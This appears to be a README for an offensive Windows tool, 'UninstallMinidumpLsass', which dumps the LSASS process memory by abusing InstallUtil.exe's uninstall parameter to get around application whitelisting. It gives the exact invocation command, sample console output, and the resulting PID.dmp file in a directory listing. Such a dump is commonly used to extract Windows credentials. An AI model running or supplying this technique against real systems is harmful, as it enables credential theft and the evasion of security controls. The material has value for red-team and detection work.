# UninstallMinidumpLsass
Performs a Minidump of the LSASS process when uninstalled using Windows InstallUtil.exe

# Purpose
Bypasses application whitelisting of non trusted binaries to perform a Minidump of the LSASS process. 
This is accomplished by passing the compiled UninstallMinidumpLsass executable into the uninstall parameter of the InstallUtil.exe Windows tool.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U UninstallMinidumpLsass.exe
```

# Execution
```
c:\Users\Caleb\>C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U UninstallMinidumpLsass.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.4084.0
Copyright (C) Microsoft Corporation.  All rights reserved.

The uninstall is beginning.
See the contents of the log file for the c:\Users\Caleb\UninstallMinidumpLsass.exe assembly's progress.
The file is located at c:\Users\Caleb\UninstallMinidumpLsass.InstallLog.
Uninstalling assembly 'c:\Users\Caleb\UninstallMinidumpLsass.exe'.
Affected parameters are:
   logtoconsole =
   assemblypath = c:\Users\Caleb\UninstallMinidumpLsass.exe
   logfile = c:\Users\Caleb\Release\UninstallMinidumpLsass.InstallLog

The uninstall has completed.
```
If successful, a file will be created in the current working directory formatted as PID.dmp
```
dc:\Users\Caleb\dir

10/05/2020  10:07 PM             6,144 UninstallMinidumpLsass.exe
10/05/2020  10:07 PM        61,420,010 966.dmp
```
